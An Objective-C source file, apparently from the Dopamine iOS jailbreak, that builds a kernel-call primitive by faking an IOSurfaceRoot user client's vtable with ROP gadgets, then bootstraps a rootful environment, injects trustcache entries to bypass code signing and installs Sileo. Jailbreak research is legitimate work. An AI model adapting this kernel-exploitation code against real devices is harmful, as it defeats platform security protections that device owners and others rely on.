//
//  DOMineek.m
//  Dopamine
//
//  Created by Mineek on 16/12/2024.
//

#import <Foundation/Foundation.h>
#import "DOEnvironmentManager.h"
#import "DOExploitManager.h"
#import "DOUIManager.h"
#import <sys/stat.h>
#import <compression.h>
#import <xpf/xpf.h>
#import <dlfcn.h>
#import <libjailbreak/codesign.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/primitives_IOSurface.h>
#import <libjailbreak/physrw_pte.h>
#import <libjailbreak/physrw.h>
#import <libjailbreak/translation.h>
#import <libjailbreak/kernel.h>
#import <libjailbreak/info.h>
#import <libjailbreak/util.h>
#import <libjailbreak/trustcache.h>
#import <libjailbreak/kalloc_pt.h>
#import <libjailbreak/jbserver_boomerang.h>
#import <libjailbreak/signatures.h>
#import <libjailbreak/jbclient_xpc.h>
#import <libjailbreak/kcall_arm64.h>
#import <CoreServices/LSApplicationProxy.h>
#import "spawn.h"
#import "Mineek-IOKit.h"
#import "DOFakeFS.h"
#import "DOMineek.h"

// MARK: kcall

static uint64_t fake_vtable = 0;
static uint64_t fake_client = 0;
static io_connect_t user_client = 0;

// edit for different ver ( currently iPX 16.6.1 )
static uint64_t add_x0_x0_0x40_ret = ADDR_add_x0_x0_0x40_ret;
static uint64_t getiotrap = ADDR_getiotrap;

uint64_t find_port_for_task(uint64_t port, uint64_t task_addr) {
    uint64_t itk_space = kread64(task_addr + koffsetof(task, itk_space));
    uint64_t is_table = kread64(itk_space + 0x20);
    uint64_t port_index = port >> 8;
    uint64_t sizeof_ipc_entry_t2 = 0x18;
    uint64_t port_addr = kread64(is_table + (port_index * sizeof_ipc_entry_t2));
    return port_addr;
}

uint64_t find_port(uint64_t port) {
    return find_port_for_task(port, task_self());
}

static uint64_t user_client_port_kobject = 0;
static uint64_t fake_vtable_backup_1 = 0;
#ifndef iOS15
static uint64_t fake_vtable_backup_2 = 0;
#endif
static uint64_t userclient_port = 0;

BOOL init_kcallmineek(void) {
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == IO_OBJECT_NULL) {
        printf("[-] Failed to get IOSurfaceRoot service\n");
        return NO;
    }
    
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[-] Failed to open IOSurfaceRoot service\n");
        return NO;
    }
    user_client = conn;
    IOObjectRelease(service);
    
    userclient_port = find_port(user_client);
    uint64_t userclient_addr = kread64(userclient_port + koffsetof(ipc_port, kobject));
    uint64_t userclient_vtab = kread64(userclient_addr);
    
    if (fake_vtable == 0)
        kalloc(&fake_vtable, 0x1000);
    printf("[*] fake_vtable: 0x%llx\n", fake_vtable);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_vtab + i * 8);
        kwrite64(fake_vtable + i * 8, data);
    }
    printf("[*] copy 1\n");
    
    if (fake_client == 0)
        kalloc(&fake_client, 0x2000);
    printf("[*] fake_client: 0x%llx\n", fake_client);
    
    for (int i = 0; i < 0x200; i++) {
        uint64_t data = kread64(userclient_addr + i * 8);
        kwrite64(fake_client + i * 8, data);
    }
    printf("[*] copy 2\n");
    kwrite64(fake_client, fake_vtable);
    printf("[*] copy 3\n");
    printf("[*] read 1\n");
    user_client_port_kobject = kread64(userclient_port + koffsetof(ipc_port, kobject));
    printf("[*] read 1: 0x%llx\n", user_client_port_kobject);
    kwrite64(userclient_port + koffsetof(ipc_port, kobject), fake_client);
    printf("[*] copy 4\n");
    printf("[*] read 2\n");
    fake_vtable_backup_1 = kread64(fake_vtable + 8 * 0xB8);
    printf("[*] read 3\n");
#ifndef iOS15
    fake_vtable_backup_2 = kread64(fake_vtable + 8 * 0xB9);
#endif
    printf("[*] writing\n");
    kwrite64(fake_vtable + 8 * 0xB8, add_x0_x0_0x40_ret + gSystemInfo.kernelConstant.slide);
#ifndef iOS15
    printf("[*] copy 5\n");
    kwrite64(fake_vtable + 8 * 0xB9, getiotrap + gSystemInfo.kernelConstant.slide);
#endif
    printf("[*] kcall inited\n");
    return YES;
}

uint64_t kcallmineek(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    uint64_t offx20 = kread64(fake_client + 0x40);
    uint64_t offx28 = kread64(fake_client + 0x48);
    kwrite64(fake_client + 0x40, x0);
    kwrite64(fake_client + 0x48, addr);
    uint64_t kcall_ret = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    kwrite64(fake_client + 0x40, offx20);
    kwrite64(fake_client + 0x48, offx28);
    return kcall_ret;
}

BOOL presetup_rootful(void) {
    printf("Initializing kcall\n");
    BOOL kcallret = init_kcallmineek();
    printf("kcallret: %d\n", kcallret);
    if (!kcallret) {
        printf("INITIALIZING KCALL FAILED.\n");
        return NO;
    }
    return YES;
}

void cleanup_kcall(void) {
    printf("Cleaning up kcall\n");
    kwrite64(fake_vtable + 8 * 0xB8, fake_vtable_backup_1);
#ifndef iOS15
    kwrite64(fake_vtable + 8 * 0xB9, fake_vtable_backup_2);
#endif
    kwrite64(userclient_port + koffsetof(ipc_port, kobject), user_client_port_kobject);
    printf("kcall cleaned up\n");
}

// MARK: rootful

void strap_rootful(void) {
    printf("Strapping rootful rn\n");
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/.procursus_strapped"]) {
        printf("Detected non strapped fakefs.\n");
        NSString *bootstrapTar = [@"/var/tmp" stringByAppendingPathComponent:@"bootstrap_r.tar"];
#ifdef iOS15
        NSString *bootstrapZstdPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"bootstrap_1800_r.tar.zst"];
#else
        NSString *bootstrapZstdPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"bootstrap_1900_r.tar.zst"];
#endif
        NSError *decompressionError = [[DOEnvironmentManager sharedManager] decompressZstd:bootstrapZstdPath toTar:bootstrapTar];
        if (decompressionError) {
            NSLog(@"Error whilst extracting zstd! : %@\n", decompressionError);
        } else {
            printf("Extraction zstd success!\n");
        }
        
        NSError *extractError = [[DOEnvironmentManager sharedManager] extractTar:bootstrapTar toPath:@"/"];
        if (extractError) {
            NSLog(@"Error whilst extracting! : %@\n", extractError);
        } else {
            printf("Extraction success!\n");
        }
        
        if ([[NSFileManager defaultManager] fileExistsAtPath:@"/prep_bootstrap.sh"]) {
            printf("Finalizing strap\n");
            int r = exec_cmd_trusted("/bin/sh", "/prep_bootstrap.sh", NULL);
            if (r != 0) {
                printf("it returned not 0! %d\n", r);
            }
        }
    }
    
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/Applications/Sileo.app"]) {
        printf("Sileo not found, installing\n");
        int ret = exec_cmd_trusted("/usr/bin/apt", "update", NULL);
        printf("apt update ret: %d\n", ret);
        ret = exec_cmd_trusted("/usr/bin/apt", "install", "libkrw0-dopamine", "org.coolstar.sileo", "-y");
        printf("apt install ret: %d\n", ret);
    }
}

void rootful_fake_fakelib(void) {
    enter_fakefs();
    printf("Strapping rootful fake fakelib rn\n");
    NSError *error;
    error = [[DOEnvironmentManager sharedManager] deleteBootstrap];
    if (error) {
        NSLog(@"ERROR WHEN REMOVE: %@\n", error);
    } else {
        NSString *basebinPath = @"/basebin";
        [[DOEnvironmentManager sharedManager] extractTar:[[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"basebin.tar"] toPath:@"/"];
        printf("success\n");

        int r = exec_cmd("/basebin/jbctl", "internal", "fakelib_init", NULL);
        if (r != 0) {
            printf("JBCTL RETURNED %d\n", r);
        }
        printf("JBCTL RETURNED %d\n", r);
        
        cdhash_t *cdhashes = NULL;
        uint32_t cdhashesCount = 0;
        macho_collect_untrusted_cdhashes("/usr/lib/dopamineek/dyld", NULL, NULL, NULL, NULL, 0, &cdhashes, &cdhashesCount);
        if (cdhashesCount != 1) printf("wtf 1\n");
        
        trustcache_file_v1 *dyldTCFile = NULL;
        r = trustcache_file_build_from_cdhashes(cdhashes, cdhashesCount, &dyldTCFile);
        free(cdhashes);
        if (r == 0) {
            int r = trustcache_file_upload_with_uuid(dyldTCFile, DYLD_TRUSTCACHE_UUID);
            if (r != 0) printf("LOL 2\n");
            free(dyldTCFile);
            printf("OMG!\n");
        }
        else {
            printf("lol 3\n");
        }
        
        NSArray *usr_libContents = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/usr/lib" error:nil];
        printf("Contents of /usr/lib:\n");
        for (NSString *usr_libContent in usr_libContents) {
            printf(" - %s\n", usr_libContent.UTF8String);
        }
    }
}

void rootful(void) {
    strap_rootful();
    cleanup_kcall();
    unlink("/var/jb");
}
